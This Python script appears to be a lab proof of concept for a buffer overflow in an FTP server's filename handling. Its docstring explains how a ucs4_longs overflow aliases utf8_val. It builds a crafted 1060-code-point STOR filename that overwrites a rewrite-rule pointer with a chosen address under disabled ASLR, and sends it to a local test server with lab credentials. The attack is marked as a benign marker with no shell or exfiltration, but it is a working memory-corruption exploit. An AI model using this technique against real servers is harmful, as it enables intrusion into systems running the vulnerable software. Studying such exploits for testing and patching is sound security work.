#!/usr/bin/env python3
"""Alias-aware benign-marker probe.

The ucs4_longs overflow aliases utf8_val: for utf8_val index i >= 1024, the
second loop reads ucs4_longs[i] at utf8_val[(i-1024)*8], already overwritten by
earlier iterations. Hence utf8_val[1056+k] takes the low byte of code point
256+8k. Place the four target bytes af d4 60 55 at code points 256/264/272/280
to make rewrite_rule_matches.match_string point at 'NOOP command successful'
(0x55555560d4af under setarch -R, PIE base 0x555555554000).
"""
import io
import socket
import time
import ftplib

host, port = "127.0.0.1", 21874
for _ in range(40):
    try:
        s = socket.create_connection((host, port), 1); s.close(); break
    except OSError:
        time.sleep(0.25)

cps = ["A"] * 1060
cps[256] = "\u00af"   # low byte 0xaf
cps[264] = "\u01d4"   # low byte 0xd4
cps[272] = "`"        # low byte 0x60
cps[280] = "U"        # low byte 0x55
key = "".join(cps)
assert len(key) == 1060, len(key)
raw = key.encode("utf-8")
print("KEY_CODEPOINTS=%d KEY_BYTES=%d TAIL=%s" % (len(key), len(raw), raw[-8:].hex()))

ftp = ftplib.FTP()
try:
    ftp.connect(host, port, timeout=8)
    ftp.login("labuser", "labpass")
    ftp.set_pasv(True)
    ftp.sock.settimeout(8)
    print("LOGIN_OK")
    try:
        ftp.storbinary("STOR " + key, io.BytesIO(b"z" * 16))
        print("STOR_MARKER_OK")
    except Exception as exc:
        print("STOR_MARKER_FAIL %s: %s" % (type(exc).__name__, str(exc)[:140]))
    for cmd in ("NOOP", "PWD"):
        try:
            print(cmd + "=" + str(ftp.voidcmd(cmd))[:100])
        except Exception as exc:
            print(cmd + "_FAIL " + type(exc).__name__ + ": " + str(exc)[:100])
except Exception as exc:
    print("CLIENT_FAIL %s: %s" % (type(exc).__name__, str(exc)[:200]))
finally:
    try:
        ftp.close()
    except Exception:
        pass
